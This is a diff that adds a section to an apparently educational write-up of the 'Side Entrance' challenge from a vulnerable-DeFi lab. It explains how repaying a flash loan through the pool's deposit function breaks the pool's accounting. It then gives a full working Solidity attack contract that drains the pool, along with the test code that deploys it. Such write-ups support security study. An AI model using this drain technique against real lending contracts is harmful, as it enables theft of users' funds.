@@ -234,3 +234,74 @@ it('Exploit', async function () {
 });
 // ...
 ```
+
+## #4 - Side Entrance
+
+This time our flash loan lender comes with additional funcitonality. It acts as a vault, so basically anyone can deposit their ether and withdraw at any time. Stacked ether is used to lend flash loans with no extra fees.
+
+We will exploit this contract by taking advantage of insecure accounting logic. Let's take a look at `flashLoan` function.
+
+```solidity
+function flashLoan(uint256 amount) external {
+    uint256 balanceBefore = address(this).balance;
+    require(balanceBefore >= amount, "Not enough ETH in balance");
+
+    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+    require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
+}
+```
+
+Two requirements seem fine at first, but one scenairo hasn't been accounted for. Once we receive flash loan, nothing prevents us from returning the loan with pool's `deposit` function. That way, inside pool's accounting, we are the owners of deposited funds. Pool balance stayed the same, but inner logic is broken and we are able to withdraw everything.
+
+For the solution, we will create new **SideEntranceAttack.sol** contract and implement the exploit.
+
+Solution code:
+
+**SideEntranceAttack.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../side-entrance/SideEntranceLenderPool.sol";
+
+contract SideEntranceAttack {
+    SideEntranceLenderPool immutable pool;
+    address immutable owner;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+        owner = msg.sender;
+    }
+
+    function attack(uint amount) external {
+        pool.flashLoan(amount);
+        pool.withdraw();
+    }
+
+    function execute() external payable {
+        pool.deposit{value: address(this).balance}();
+    }
+
+    receive() external payable {
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        require(success, "transfer failed");
+    }
+}
+```
+
+**side-entrance.challenge.js**
+
+```js
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const AttackFactory = await ethers.getContractFactory(
+    'SideEntranceAttack',
+    attacker
+  );
+  const attackContract = await AttackFactory.deploy(this.pool.address);
+
+  await attackContract.attack(ETHER_IN_POOL);
+});
+```
